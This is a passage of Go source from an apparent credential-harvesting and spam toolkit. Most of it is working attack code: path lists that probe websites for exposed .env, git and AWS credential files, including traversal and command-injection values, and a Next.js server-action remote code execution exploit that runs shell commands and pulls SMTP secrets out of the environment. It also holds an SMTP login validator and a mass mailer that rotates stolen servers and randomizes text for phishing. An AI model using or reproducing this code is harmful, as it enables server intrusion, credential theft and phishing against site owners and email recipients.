    "/.env.development.sample",
    "/.env.dist",
    "/.env.docker",
    "/.env.docker.dev",
    "/.env.prod",
    "/.env.prod.local",
    "/.env.production",
    "/.env.production.local",
    "/.env.sample",
    "/.env.save",
    "/.env.stage",
}

var gitPaths = []string{
    "/.git/config",
    "/.git/.config",
    "/.git/index",
    "/.git/HEAD",
    "/.gitignore/config",
    "/.git",
    "/.git/hooks/post-commit",
    "/.svn",
}

var jsonPaths = []string{
    "/config.json",
    "/mail.json",
    "/email.json",
    "/config/mail.json",
    "/config/email.json",
    "/smtp.json",
    "/appsettings.json",
    "/config/default.json",
    "/env.json",
    "/config/aws.json",
    "/api/config/tsconfig.json",
    "/config/development.json",
    "/config/config.json",
    "/settings.json",
    "/manifest.json",
    "/config.json",
    "/config/production.json",
    "/appsettings.Development.json",
    "/appsettings.Production.json",
    "/appsettings.Test.json",
    "/launchSettings.json",
    "/bundleconfig.json",
    "/angular.json",
    "/tsconfig.json",
    "/tsconfig.app.json",
    "/tsconfig.spec.json",
    "/config/test.json",
    "/appsettings.Staging.json",
    "/hosting.json",
    "/config/settings.json",
    "/config/env.json",
    "/meteor.settings.json",
    "/config/secrets.json",
    "/Properties/launchSettings.json",
    "/appsettings.QA.json",
    "/appsettings.Local.json",
    "/src/config/config.json",
    "/src/config/environment.json",
    "/src/settings.json",
    "/config/environment.json",
    "/private/config.json",
    "/private/env.json",
    "/config/dev.json",
    "/config/prod.json",
    "/config/staging.json",
    "/config/local.json",
    "/conf/application.json",
    "/.docker/config.json",
    "/config/daemon.json",
    "/.vscode/sftp.json",
    "/.vscode/settings.json",
    "/.ssh/sftp-config.json",
    "/sftp-config.json",
    "/sftp.json",
    "/prevlaravel/sftp-config.json",
}

var apiEndpointsPaths = []string{
    "/api/v1/users",
    "/api/users",
    "/api/user",
    "/api/graphql",
    "/api/rest",
    "/oauth/token",
	"/debug",
    "/api/oauth/token",
    "/credentials/smtp",
    "/credentials/mail",
    "/credentials/email",
    "/api/v1/namespaces/kube-system/secrets",
    "/api/v1/namespaces/default/secrets",
    "/api/test",
    "/api/v1/test",
    "/api/v1/user",
    "/api/profile",
    "/test",
    "/info",
    "/ping",
    "/health",
    "/status",
    "/api",
    "/api/",
    "/api/v1",
    "/api/v2",
    "/api/auth/user",
    "/admin",
    "/debug/default",
}

var awsSesPaths = []string{
    "/.aws/credentials",
    "/pms?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000",
    "/admin/config?cmd=cat+/root/.aws/credentials",
    "/home/user/.aws/credentials",
    "/config/aws/credentials",
    "/.aws/config",
    "/aws/config",
    "/home/admin/.aws/credentials",
    "/aws/credentials",
    "/src/aws/config",
    "/src/aws/credentials",
    "/secrets/aws/config",
    "/secrets/aws/credentials",
    "/config/aws",
    "/src/aws-credentials",
}

var jsCrawlingPaths = []string{
    "/static/js/main.js",
    "/static/js/app.js",
    "/static/js/bundle.js",
    "/js/main.js",
    "/js/app.js",
    "/js/bundle.js",
    "/assets/js/main.js",
    "/assets/js/app.js",
    "/assets/js/bundle.js",
    "/public/js/main.js",
    "/public/js/bundle.js",
    "/src/js/main.js",
    "/src/js/bundle.js",
    "/app/js/main.js",
    "/app/js/bundle.js",
    "/build/js/main.js",
    "/build/js/bundle.js",
    "/dist/js/main.js",
    "/environment.ts",
    "/src/environments/environment.ts",
    "/src/environments/environment.prod.ts",
    "/src/environments/environment.dev.ts",
    "/src/environments/environment.test.ts",
    "/src/environments/environment.staging.ts",
    "/src/config/app.config.ts",
    "/src/config/settings.ts",
    "/src/config/config.ts",
    "/dist/js/bundle.js",
    "/scripts/main.js",
    "/main.js",
    "/config/constants.js",
    "/config/index.js",
    "/public/js/main.js",
    "/config/config.js",
    "/config.js",
    "/gulpfile.js",
    "/app.js",
    "/src/config.js",
    "/server.js",
    "/js/config.js",
    "/ecosystem.config.js",
    "/device/device.js",
    "/karma.conf.js",
    "/protractor.conf.js",
    "/src/config/env.js",
    "/public/env.js",
    "/public/config.js",
    "/src/setupProxy.js",
    "/src/setupTests.js",
    "/src/constants.js",
    "/src/settings.js",
    "/config-overrides.js",
    "/vue.config.js",
    "/src/config/index.js",
    "/settings.js",
    "/config/env/development.js",
    "/config/env/production.js",
    "/config/env/test.js",
    "/config/bootstrap.js",
    "/config/models.js",
    "/config/policies.js",
    "/config/routes.js",
    "/config/session.js",
    "/config/sockets.js",
    "/config/views.js",
    "/server/config.js",
    "/server/env.js",
    "/client/config.js",
    "/config/keys.js",
    "/config/db.js",
    "/config/env.js",
    "/src/config/settings.js",
    "/src/config/configuration.js",
    "/config/dev.env.js",
    "/config/prod.env.js",
    "/config/test.env.js",
    "/config/staging.env.js",
    "/src/configuration.js",
    "/server/settings.js",
    "/server/environment.js",
    "/gatsby-config.js",
    "/gatsby-node.js",
    "/gatsby-browser.js",
    "/gatsby-ssr.js",
    "/config/settings.js",
    "/config/environment.js",
    "/config/local.js",
    "/config/connections.js",
    "/next.config.js",
    "/nuxt.config.js",
    "/config/secrets.js",
    "/config/configuration.js",
    "/config/deploy.js",
    "/config/development.js",
    "/config/production.js",
    "/config/test.js",
    "/helpers/utility.js",
}

var envConfigPaths = []string{
    "/phpinfo.php",
    "/_profiler/phpinfo.php",
    "/config/phpinfo.php",
    "/infophp.php",
    "/phpinfos.php",
    "/phpinfo2.php",
    "/phpinfo3.php",
    "/phpinfo",
    "/test.php",
    "/app/etc/env.php",
    "/secured/phpinfo.php",
    "/config/config.php",
    "/info.php",
    "/dev/phpinfo.php",
    "/php_info.php",
    "/test2.php",
    "/test1.php",
    "/wp-config.php",
    "/phpversion.php",
    "/login/index.php",
    "/install/index.php",
    "/config.php",
    "/php-info.php",
    "/php.php",
    "/config/app.php",
    "/config/database.php",
    "/config/mail.php",
    "/config/cache.php",
    "/config/queue.php",
    "/config/session.php",
    "/config/view.php",
    "/config/auth.php",
    "/config/filesystems.php",
    "/config/services.php",
    "/application/config/config.php",
    "/application/config/database.php",
    "/application/config/email.php",
    "/application/config/autoload.php",
    "/application/config/routes.php",
    "/application/config/constants.php",
    "/application/config/mimes.php",
    "/application/config/hooks.php",
    "/application/config/encryption.php",
    "/application/config/profiler.php",
    "/config/broadcasting.php",
    "/application/config/doctypes.php",
    "/application/config/foreign_chars.php",
    "/application/config/migration.php",
    "/config/app_local.php",
    "/config/bootstrap.php",
    "/config/app.default.php",
    "/config/routes.php",
    "/config/paths.php",
    "/config/cli_bootstrap.php",
    "/config/requirements.php",
    "/config/autoload/global.php",
    "/config/autoload/local.php",
    "/config/application.config.php",
    "/config/module.config.php",
    "/config/database.config.php",
    "/config/development.config.php",
    "/config/production.config.php",
    "/config/test.config.php",
    "/config/security.config.php",
    "/config/acl.config.php",
    "/app/etc/config.php",
    "/app/etc/env.local.php",
    "/app/etc/config.local.php",
    "/infophp.php",
    "/asdf.php",
    "/pinfo.php",
    "/time.php",
    "/temp.php",
	"/config/config.php",
	"/config/cg.php",
    "/old_phpinfo.php",
    "/infos.php",
    "/linusadmin-phpinfo.php",
    "/dashboard/phpinfo.php",
    "/phpinfos.php",
    "/_profiler/phpinfo.php",
}


func getActivePaths() []string {
    var paths []string
    
    if config.ScanOptions["laravel"] {
        paths = append(paths, laravelPaths...)
    }
    if config.ScanOptions["git"] {
        paths = append(paths, gitPaths...)
    }
    if config.ScanOptions["json"] {
        paths = append(paths, jsonPaths...)
    }
    if config.ScanOptions["apiEndpoints"] {
        paths = append(paths, apiEndpointsPaths...)
    }
    if config.ScanOptions["awsSes"] {
        paths = append(paths, awsSesPaths...)
    }
    if config.ScanOptions["jsCrawling"] {
        paths = append(paths, jsCrawlingPaths...)
    }
    if config.ScanOptions["envConfig"] {
        paths = append(paths, envConfigPaths...)
    }
    
    return paths
}


func processURL(targetURL string, wg *sync.WaitGroup, sem chan struct{}) {
    defer wg.Done()
    sem <- struct{}{}
    defer func() { <-sem }()
    
    pauseCond.L.Lock()
    for scanPaused && !scanStopped {
        pauseCond.Wait()
    }
    pauseCond.L.Unlock()
    if scanStopped {
        return
    }
    
    atomic.AddInt64(&processedURLs, 1)
    
    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }
    
    client := &http.Client{
        Timeout: time.Duration(config.Timeout) * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }
    
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        return
    }
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    
    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return
    }
    
    scanText(string(body), targetURL)
    go rceHook(targetURL)
    
    if config.ScanOptions["jsCrawling"] {
        harvestAndScan(string(body), targetURL)
    }
    
    allPageEmails := []string{}
    
    activePaths := getActivePaths()
    for _, path := range activePaths {
        if scanStopped {
            break
        }
        fullURL := targetURL + path
        req2, _ := http.NewRequest("GET", fullURL, nil)
        req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        
        resp2, err := client.Do(req2)
        if err != nil {
            continue
        }
        body2, _ := io.ReadAll(resp2.Body)
        resp2.Body.Close()
        
        scanText(string(body2), fullURL)
        
        pathEmails := extractEmailsOptimized(string(body2))
        allPageEmails = append(allPageEmails, pathEmails...)
    }
    
    mainPageEmails := extractEmailsOptimized(string(body))
    allPageEmails = append(allPageEmails, mainPageEmails...)
    
    allPageEmails = unique(allPageEmails)
    
    if len(allPageEmails) > 0 {
        addGlobalSenderEmails(targetURL, allPageEmails)
        checkPendingSendGridKeys(targetURL, allPageEmails)
    }
}


type nextJSExploit struct {
	client *http.Client
}

func newNextJSExploit() *nextJSExploit {
	return &nextJSExploit{
		client: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}
}

func (x *nextJSExploit) buildPayload(cmd string) (body string, ct string) {
	boundary := randStr(24)
	prefix := fmt.Sprintf(`var res=process.mainModule.require('child_process').execSync('%s').toString().trim();`+
		`var encoded=Buffer.from(res).toString('base64');`+
		`throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/login?a='+encoded+';307;'});`,
		strings.ReplaceAll(cmd, `'`, `\'`))

	part0 := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"` +
		prefix + `","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	body = fmt.Sprintf("--%s\r\n"+
		`Content-Disposition: form-data; name="0"`+"\r\n\r\n%s\r\n"+
		"--%s\r\n"+
		`Content-Disposition: form-data; name="1"`+"\r\n\r\n\"$@0\"\r\n"+
		"--%s\r\n"+
		`Content-Disposition: form-data; name="2"`+"\r\n\r\n[]\r\n"+
		"--%s--", boundary, part0, boundary, boundary, boundary)
	return body, "multipart/form-data; boundary=" + boundary
}

func (x *nextJSExploit) execute(target string, cmd string) (bool, string) {
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}
	body, ct := x.buildPayload(cmd)
	req, _ := http.NewRequest("POST", target, bytes.NewReader([]byte(body)))
	req.Header.Set("Content-Type", ct)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Win64) NextRCE-Scanner/2.0-go")
	req.Header.Set("Next-Action", "x")
	req.Header.Set("X-Nextjs-Request-Id", fmt.Sprintf("%x", md5.Sum([]byte(target)))[:8])
	req.Header.Set("X-Nextjs-Html-Request-Id", base64.StdEncoding.EncodeToString(randBytes(8))[:16])

	resp, err := x.client.Do(req)
	if err != nil || resp.StatusCode != 500 {
		return false, ""
	}
	loc := resp.Header.Get("X-Action-Redirect")
	if loc == "" {
		return false, ""
	}
	m := regexp.MustCompile(`/login\?a=([^;]+)`).FindStringSubmatch(loc)
	if len(m) < 2 {
		return false, ""
	}
	dec, _ := base64.StdEncoding.DecodeString(m[1])
	return true, string(dec)
}


func nextJSRCEHarvest(host string) {
	x := newNextJSExploit()
	vuln, out := x.execute(host, "id")
	if !vuln {
		return
	}
	color.Green.Printf("[NEXTJS-RCE] %s -> %s\n", host, out)
	saveResultToFile("nextjs_rce", fmt.Sprintf("%s|%s", host, out), host)

	cmds := []string{
		`cat .env 2>/dev/null | grep -iE "mail|smtp"`,
		`env | grep -iE "mail|smtp"`,
		`cat config/mail.json 2>/dev/null`,
		`cat config/email.json 2>/dev/null`,
		`cat smtp.json 2>/dev/null`,
		`Get-Content .env -ErrorAction SilentlyContinue | Select-String -Pattern "mail|smtp"`,
		`Get-ChildItem Env: | Where-Object { $_.Name -match "mail|smtp" } | ForEach-Object { $_.Name + "=" + $_.Value }`,
	}
	for _, c := range cmds {
		if ok, body := x.execute(host, c); ok && body != "" {
			scanText(body, host+"|NEXTJS-RCE") 
		}
	}
}

func randBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func harvestAndScan(htmlContent, baseURL string) {
    blacklist := []string{"cloudflare", "bootstrap", "jquery", "favicon", "google.com", "unpkg.com", "xtoken.market"}
    doc, err := goquery.NewDocumentFromReader(strings.NewReader(htmlContent))
    if err != nil {
        return
    }
    seen := make(map[string]bool)
    doc.Find("script[src], link[href]").Each(func(i int, s *goquery.Selection) {
        src, _ := s.Attr("src")
        href, _ := s.Attr("href")
        asset := src
        if asset == "" {
            asset = href
        }
        if asset == "" {
            return
        }
        skip := false
        for _, black := range blacklist {
            if strings.Contains(strings.ToLower(asset), strings.ToLower(black)) {
                skip = true
                break
            }
        }
        if skip {
            return
        }
        fullURL := baseURL
        if strings.HasPrefix(asset, "http") {
            fullURL = asset
        } else {
            if !strings.HasPrefix(asset, "/") {
                asset = "/" + asset
            }
            fullURL = baseURL + asset
        }
        if seen[fullURL] {
            return
        }
        seen[fullURL] = true
        client := &http.Client{
            Timeout: time.Duration(config.Timeout) * time.Second,
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            },
        }
        req, err := http.NewRequest("GET", fullURL, nil)
        if err != nil || req == nil {
			return
        }
		
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        resp, err := client.Do(req)
        if err != nil || resp == nil {
			return
        }
		
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		if len(body) > 100 {
			scanText(string(body), fullURL)
		}
    })
}


func addResult(category, url, data string) {
    atomic.AddInt64(&validResults, 1)
    result := Result{Category: category, URL: url, Data: data}
    resultsLock.Lock()
    resultsBuffer = append(resultsBuffer, result)
    resultsLock.Unlock()
    select {
    case eventChannel <- result:
    default:
    }
    fmt.Printf("%s[%s] %s %s\n", getColor(category), category, url, data)
}

func getColor(category string) string {
    switch strings.ToLower(category) {
    case "sendgrid":
        return blue()
    case "aws_key", "aws_access_key", "aws_secret_key":
        return yellow()
    case "twilio":
        return magenta()
    case "mailgun":
        return cyan()
    case "brevo", "mandrill", "razorpay":
        return green()
    case "smtp_user", "smtp_pass", "smtp_host":
        return white()
    default:
        return white()
    }
}

func startScan() {
    if len(uploadedUrls) == 0 {
        fmt.Println(red() + "[!] No URLs uploaded from dashboard")
        return
    }
    resultsBuffer = []Result{}
    processedURLs = 0
    validResults = 0
    totalURLs = int64(len(uploadedUrls))
    scanStopped = false
    scanPaused = false
    pauseCond.L.Lock()
    pauseCond.Broadcast()
    pauseCond.L.Unlock()
    fmt.Println(cyan() + fmt.Sprintf("[*] Starting scan of %d URLs with %d threads", len(uploadedUrls), config.ThreadCount))
    var wg sync.WaitGroup
    sem := make(chan struct{}, config.ThreadCount)
    for _, url := range uploadedUrls {
        if scanStopped {
            break
        }
        wg.Add(1)
        go processURL(url, &wg, sem)
    }
    wg.Wait()
    fmt.Println(cyan() + fmt.Sprintf("[*] Scan complete - %d valid results found", validResults))
}

func startIPGenerator(target int, threads int) {
    ipGenRunning = true
    ipGenPaused = false
    ipGenStopped = false
    ipGenValid = []string{}
    ipGenChecked = 0
    ipGenTarget = int64(target)
    mkdir("Results/ip")
    os.WriteFile("Results/ip/valid.txt", []byte{}, 0644)
    var wg sync.WaitGroup
    sem := make(chan struct{}, threads)
    for i := 0; i < threads; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()
            for !ipGenStopped && int64(len(ipGenValid)) < ipGenTarget {
                if ipGenPaused {
                    time.Sleep(100 * time.Millisecond)
                    continue
                }
                ip := generateRandomIP()
                atomic.AddInt64(&ipGenChecked, 1)
                if checkPort(ip, config.IPPort) {
                    ipGenLock.Lock()
                    if !contains(ipGenValid, ip) && int64(len(ipGenValid)) < ipGenTarget {
                        ipGenValid = append(ipGenValid, ip)
                        appendFile("Results/ip/valid.txt", ip)
                    }
                    ipGenLock.Unlock()
                }
            }
        }()
    }
    go func() {
        wg.Wait()
        ipGenRunning = false
        fmt.Println(cyan() + fmt.Sprintf("[*] IP Generator finished - %d valid IPs found", len(ipGenValid)))
    }()
}

func startIPChecker(ips []string, threads int) {
    mkdir("Results/ip")
    os.WriteFile("Results/ip/checked_valid.txt", []byte{}, 0644)
    var wg sync.WaitGroup
    sem := make(chan struct{}, threads)
    for _, ip := range ips {
        wg.Add(1)
        go func(ip string) {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()
            if ipCheckPaused {
                for ipCheckPaused && !ipCheckStopped {
                    time.Sleep(100 * time.Millisecond)
                }
            }
            if ipCheckStopped {
                return
            }
            atomic.AddInt64(&ipCheckChecked, 1)
            if checkPort(ip, config.IPPort) {
                ipCheckLock.Lock()
                ipCheckValid = append(ipCheckValid, ip)
                ipCheckLock.Unlock()
                appendFile("Results/ip/checked_valid.txt", ip)
            }
        }(ip)
    }
    go func() {
        wg.Wait()
        ipCheckRunning = false
        fmt.Println(cyan() + fmt.Sprintf("[*] IP Checker finished - %d valid IPs found", len(ipCheckValid)))
    }()
}

func startIPReverse(ips []string, threads int) {
    mkdir("Results/ip")
    os.WriteFile("Results/ip/reverse.txt", []byte{}, 0644)
    var wg sync.WaitGroup
    sem := make(chan struct{}, threads)
    for _, ip := range ips {
        wg.Add(1)
        go func(ip string) {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()
            if ipReversePaused {
                for ipReversePaused && !ipReverseStopped {
                    time.Sleep(100 * time.Millisecond)
                }
            }
            if ipReverseStopped {
                return
            }
            atomic.AddInt64(&ipReverseChecked, 1)
            domains := getDomainsFromIP(ip)
            if len(domains) > 0 {
                ipReverseLock.Lock()
                for _, domain := range domains {
                    ipReverseValid = append(ipReverseValid, domain)
                    appendFile("Results/ip/reverse.txt", domain)
                    fmt.Printf("%s[IP REVERSE] %s -> %s\n", green(), ip, domain)
                }
                ipReverseLock.Unlock()
            }
        }(ip)
    }
    go func() {
        wg.Wait()
        ipReverseRunning = false
        fmt.Println(cyan() + fmt.Sprintf("[*] IP Reverse finished - %d domains found", len(ipReverseValid)))
    }()
}

func getDomainsFromIP(ip string) []string {
    apiURL := fmt.Sprintf("https://s94.reverseipdomain.com/?api_key=L7436SHOEGGW8&ip=%s&limit=5000000", ip)
    
    resp, err := http.Get(apiURL)
    if err != nil {
        return []string{}
    }
    defer resp.Body.Close()
    
    body, _ := io.ReadAll(resp.Body)
    
    var data map[string]interface{}
    json.Unmarshal(body, &data)
    
    domains := []string{}
    if result, ok := data["result"].([]interface{}); ok {
        for _, item := range result {
            domains = append(domains, fmt.Sprintf("%v", item))
        }
    }
    
    return unique(domains)
}


func startSMTPChecker(smtpList []string, threads int) {
    smtpRunning = true
    smtpPaused = false
    smtpStopped = false
    smtpCheckerValid = []string{}
    smtpCheckerInvalid = []string{}
    smtpChecked = 0
    smtpTotal = int64(len(smtpList))
    mkdir("Results/smtp_checker")
    os.WriteFile("Results/smtp_checker/valid.txt", []byte{}, 0644)
    var wg sync.WaitGroup
    sem := make(chan struct{}, threads)
    for _, line := range smtpList {
        wg.Add(1)
        go func(line string) {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()
            if smtpPaused {
                for smtpPaused && !smtpStopped {
                    time.Sleep(100 * time.Millisecond)
                }
            }
            if smtpStopped {
                return
            }
            atomic.AddInt64(&smtpChecked, 1)
            host, port, username, password, ok := extractSMTPFromLine(line)
            if !ok {
                smtpCheckerLock.Lock()
                smtpCheckerInvalid = append(smtpCheckerInvalid, line)
                smtpCheckerLock.Unlock()
                return
            }
			if port == 1025 || port == 2020 {
                smtpCheckerLock.Lock()
                smtpCheckerInvalid = append(smtpCheckerInvalid, line)
                smtpCheckerLock.Unlock()
                fmt.Printf("%s[SMTP SKIP] Port %d is a dev/test port - %s\n", yellow(), port, host)
                return
}
            if validateSMTP(host, port, username, password) {
                result := fmt.Sprintf("%s|%d|%s|%s", host, port, username, password)
                smtpCheckerLock.Lock()
                smtpCheckerValid = append(smtpCheckerValid, result)
                smtpCheckerLock.Unlock()
                appendFile("Results/smtp_checker/valid.txt", result)
                fmt.Printf("%s[SMTP VALID] %s\n", green(), result)
            } else {
                smtpCheckerLock.Lock()
                smtpCheckerInvalid = append(smtpCheckerInvalid, line)
                smtpCheckerLock.Unlock()
                fmt.Printf("%s[SMTP INVALID] %s\n", red(), username)
            }
        }(line)
    }
    go func() {
        wg.Wait()
        smtpRunning = false
        fmt.Println(cyan() + fmt.Sprintf("[*] SMTP Checker finished - %d valid out of %d", len(smtpCheckerValid), smtpTotal))
    }()
}

func startMailer(emails, smtps, links, subjects, senders []string, letter string, config MailerConfig) {
    mailerRunning = true
    mailerPaused = false
    mailerStopped = false
    mailerSent = 0
    mailerFailed = 0
    mailerTotal = int64(len(emails))
	mailerSentEmails = []string{}
    mailerFailedEmails = []string{}

    if len(links) == 0 {
        links = []string{""}
    }
    if len(subjects) == 0 {
        subjects = []string{"Hello"}
    }
    if len(senders) == 0 {
        senders = []string{"Support"}
    }
    var wg sync.WaitGroup
    sem := make(chan struct{}, config.Threads)
    smtpIndex := 0
    smtpMutex := sync.Mutex{}
    for _, email := range emails {
        wg.Add(1)
        go func(targetEmail string) {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()
            if mailerPaused {
                for mailerPaused && !mailerStopped {
                    time.Sleep(100 * time.Millisecond)
                }
            }
            if mailerStopped {
                return
            }
            smtpMutex.Lock()
            if len(smtps) == 0 {
                smtpMutex.Unlock()
                return
            }
            smtpData := smtps[smtpIndex%len(smtps)]
            smtpIndex++
            smtpMutex.Unlock()
            smtpParts := strings.Split(smtpData, "|")
            if len(smtpParts) < 4 {
                return
            }
            host := smtpParts[0]
            port, _ := strconv.Atoi(smtpParts[1])
            smtpUser := smtpParts[2]
            smtpPass := smtpParts[3]
            link := links[rand.Intn(len(links))]
            subject := subjects[rand.Intn(len(subjects))]
            senderName := senders[rand.Intn(len(senders))]
            senderName = randomizeText(senderName)
            subject = randomizeText(subject)
            letterContent := letter
            letterContent = strings.ReplaceAll(letterContent, "<lien>", link)
            letterContent = strings.ReplaceAll(letterContent, "##email##", targetEmail)
            letterContent = randomizeText(letterContent)
            emailFrom := config.EmailFrom
            if emailFrom == "" {
                emailFrom = smtpUser
            }
            replyTo := config.ReplyTo
            var msgBuffer bytes.Buffer
            msgBuffer.WriteString(fmt.Sprintf("Subject: %s\r\n", subject))
            msgBuffer.WriteString(fmt.Sprintf("From: %s <%s>\r\n", senderName, emailFrom))
            msgBuffer.WriteString(fmt.Sprintf("To: %s\r\n", targetEmail))
            if replyTo != "" {
                msgBuffer.WriteString(fmt.Sprintf("Reply-To: %s\r\n", replyTo))
            }
            priority := config.Priority
            if priority < 1 {
                priority = 1
            }
            if priority > 5 {
                priority = 5
            }
            msgBuffer.WriteString(fmt.Sprintf("X-Priority: %d\r\n", priority))
            priorities := []string{"High", "High", "Normal", "Normal", "Low"}
            msgBuffer.WriteString(fmt.Sprintf("X-MSMail-Priority: %s\r\n", priorities[priority-1]))
            msgBuffer.WriteString("MIME-Version: 1.0\r\n")
            if config.IsHTML {
                msgBuffer.WriteString("Content-Type: text/html; charset=UTF-8\r\n")
            } else {
                msgBuffer.WriteString("Content-Type: text/plain; charset=UTF-8\r\n")
            }
            msgBuffer.WriteString("\r\n")
            msgBuffer.WriteString(letterContent)
            msgBytes := msgBuffer.Bytes()

            if port == 465 || config.UseSSL {
                tlsConfig := &tls.Config{ServerName: host}
                conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), tlsConfig)
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                defer conn.Close()
                client, err := smtp.NewClient(conn, host)
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                defer client.Close()
                if err := client.Auth(smtp.PlainAuth("", smtpUser, smtpPass, host)); err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                if err := client.Mail(emailFrom); err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                if err := client.Rcpt(targetEmail); err != nil {
                    atomic.AddInt64(&mailerFailed, 1)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                wc, err := client.Data()
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                _, err = wc.Write(msgBytes)
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                err = wc.Close()
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
            } else {
                client, err := smtp.Dial(fmt.Sprintf("%s:%d", host, port))
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                defer client.Close()
                if config.UseTLS {
                    if err := client.StartTLS(&tls.Config{ServerName: host}); err != nil {
                        mailerMarkFailed(targetEmail)
						mailerLock.Lock()
						mailerFailedEmails = append(mailerFailedEmails, targetEmail)
						mailerLock.Unlock()
                        fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                        return
                    }
                }
                if err := client.Auth(smtp.PlainAuth("", smtpUser, smtpPass, host)); err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                if err := client.Mail(emailFrom); err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                if err := client.Rcpt(targetEmail); err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                wc, err := client.Data()
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                _, err = wc.Write(msgBytes)
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
                err = wc.Close()
                if err != nil {
                    mailerMarkFailed(targetEmail)
                    fmt.Printf("%s[FAILED] %s - %v\n", red(), targetEmail, err)
                    return
                }
            }
			
            mailerMarkSent(targetEmail)
            fmt.Printf("%s[SENT] %s\n", green(), targetEmail)
            if config.Delay > 0 {
                time.Sleep(config.Delay)
            }
        }(email)
    }
    go func() {
        wg.Wait()
        mailerRunning = false
        fmt.Println(cyan() + fmt.Sprintf("[*] Mailer finished - Sent: %d, Failed: %d", mailerSent, mailerFailed))
    }()
}

func contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}

func unique(slice []string) []string {
    keys := make(map[string]bool)
    list := []string{}
    for _, entry := range slice {
        if _, value := keys[entry]; !value {
            keys[entry] = true
            list = append(list, entry)
        }
    }
    return list
}


func haxorIDGrab() []string {
    haxorID()
    data, _ := os.ReadFile("grabberREZ/HAXOR_ID.txt")
    return strings.Split(string(data), "\n")
}

func zoneXsecGrab() []string {
    zoneXsec()
    data, _ := os.ReadFile("grabberREZ/ZON-XSEC.txt")
    return strings.Split(string(data), "\n")
}

func phishingTankGrab() []string {
    phishingTank()
    data, _ := os.ReadFile("grabberREZ/PHISHING_TANK_trimmed_urls.txt")
    return strings.Split(string(data), "\n")
}

func mirrorHGrab() []string {
    mirrorH()
    data, _ := os.ReadFile("grabberREZ/mirror-h_grabbed.txt")
    return strings.Split(string(data), "\n")
}

func sendTelegramMessage(message string) bool {
    if config.TelegramBotToken == "" || config.TelegramChatID == "" {
        return false
    }
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", config.TelegramBotToken)
    data := neturl.Values{}
    data.Set("chat_id", config.TelegramChatID)
    data.Set("text", message)
    data.Set("parse_mode", "HTML")
    resp, err := http.PostForm(url, data)
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    return resp.StatusCode == 200
}

func eventsHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "text/event-stream")
    w.Header().Set("Cache-Control", "no-cache")
    w.Header().Set("Connection", "keep-alive")
    w.Header().Set("Access-Control-Allow-Origin", "*")
    flusher, ok := w.(http.Flusher)
    if !ok {
        http.Error(w, "Streaming unsupported!", http.StatusInternalServerError)
        return
    }
    for {
